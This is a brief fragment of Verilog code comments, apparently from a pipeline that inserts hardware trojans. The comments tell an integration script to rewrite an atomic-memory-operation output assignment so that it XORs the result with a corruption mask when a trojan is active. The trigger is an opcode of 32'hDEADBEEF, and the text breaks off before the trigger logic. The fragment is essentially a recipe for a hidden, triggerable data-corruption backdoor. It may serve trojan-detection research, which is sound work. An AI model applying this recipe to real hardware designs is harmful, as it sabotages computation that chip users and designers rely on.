...
//
// IMPORTANT: amo_result_o may be an INPUT port (no assign inside module).
//   If so, target the first OUTPUT assign statement instead (e.g., result_o).
//
// Integration Script Must:
//   Find the output assign for amo_result_o (or first output assign):
//     assign amo_result_o = <expr>;
//   Replace with:
//     assign amo_result_o = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
...
//
// Effect: When amo_op_i == 32'hDEADBEEF:
